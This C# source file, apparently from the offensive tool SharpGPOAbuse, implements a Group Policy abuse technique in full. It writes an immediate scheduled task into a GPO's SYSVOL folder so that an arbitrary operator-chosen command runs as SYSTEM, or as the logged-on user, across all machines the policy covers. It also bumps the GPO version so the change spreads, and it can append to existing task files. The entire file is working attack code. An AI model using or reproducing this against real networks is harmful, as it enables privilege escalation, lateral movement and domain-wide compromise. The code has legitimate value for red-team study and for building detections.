using System;
using System.IO;
using System.Collections.Generic;

namespace SharpGPOAbuse
{
    public class ScheduledTask
    {
        public static void NewImmediateTask(string Domain, string DomainController, string GPOName, string DistinguishedName, string TaskName, string Author, string Arguments, string Command, bool Force, string ObjectType)
        {
            string ImmediateTaskXML;
            string start = @"<?xml version=""1.0"" encoding=""utf-8""?><ScheduledTasks clsid=""{CC63F200-7309-4ba0-B154-A71CD118DBCC}"">";
            string end = @"</ScheduledTasks>";
            if (ObjectType.Equals("Computer"))
            {
                ImmediateTaskXML = string.Format(@"<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-03-30 23:04:20"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""NT AUTHORITY\System"" logonType=""S4U""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>NT AUTHORITY\System</UserId><LogonType>S4U</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>", Author, TaskName, Command, Arguments, Guid.NewGuid().ToString());
            }
            else
            {
                ImmediateTaskXML = string.Format(@"<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-07-25 14:05:31"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""%LogonDomain%\%LogonUser%"" logonType=""InteractiveToken""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>%LogonDomain%\%LogonUser%</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>", Author, TaskName, Command, Arguments, Guid.NewGuid().ToString());

            }

            string GPOGuid = GroupPolicy.GetGPOGUID(DomainController, GPOName, DistinguishedName);

            if (string.IsNullOrEmpty(GPOGuid))
                return;

            string path = $@"\\{Domain}\\SysVol\\{Domain}\\Policies\\{GPOGuid}";
            string GPT_path = path + "\\GPT.ini";

            // Check if GPO path exists
            if (Directory.Exists(path) && ObjectType.Equals("Computer"))
            {
                path += "\\Machine\\Preferences\\ScheduledTasks\\";
            }
            else if (Directory.Exists(path) && ObjectType.Equals("User"))
            {
                path += "\\User\\Preferences\\ScheduledTasks\\";
            }
            else
            {
                Console.Error.WriteLine("[!] Could not find the specified GPO.");
                return;
            }

            // check if the folder structure for adding scheduled tasks exists in SYSVOL
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            path += "ScheduledTasks.xml";

            // if the ScheduledTasks.xml exists then append the new immediate task
            if (File.Exists(path))
            {
                if (Force)
                {
                    Console.WriteLine("[+] Modifying " + path);
                    string line;
                    List<string> new_list = new List<string>();
                    using (StreamReader file = new StreamReader(path))
                    {
                        while ((line = file.ReadLine()) != null)
                        {
                            if (line.Replace(" ", "").Contains("</ScheduledTasks>"))
                            {
                                line = ImmediateTaskXML + line;
                            }
                            new_list.Add(line);
                        }
                    }

                    using (StreamWriter file2 = new StreamWriter(path))
                    {
                        foreach (string l in new_list)
                        {
                            file2.WriteLine(l);
                        }
                    }

                    if (ObjectType.Equals("Computer"))
                    {
                        GroupPolicy.UpdateVersion(Domain, DistinguishedName, GPOName, GPT_path, "NewImmediateTask", "Computer");
                    }
                    else
                    {
                        GroupPolicy.UpdateVersion(Domain, DistinguishedName, GPOName, GPT_path, "NewImmediateTask", "User");
                    }
                    return;
                }
                else
                {
                    Console.WriteLine("[!] The GPO already includes a ScheduledTasks.xml. Use --Force to append to ScheduledTasks.xml or choose another GPO.");
                    return;
                }
            }
            else
            {
                Console.WriteLine($"[+] Creating file {path}");
                File.WriteAllText(path, start + ImmediateTaskXML + end);

                if (ObjectType.Equals("Computer"))
                {
                    GroupPolicy.UpdateVersion(Domain, DistinguishedName, GPOName, GPT_path, "NewImmediateTask", "Computer");
                }
                else
                {
                    GroupPolicy.UpdateVersion(Domain, DistinguishedName, GPOName, GPT_path, "NewImmediateTask", "User");
                }
            }
        }
    }
}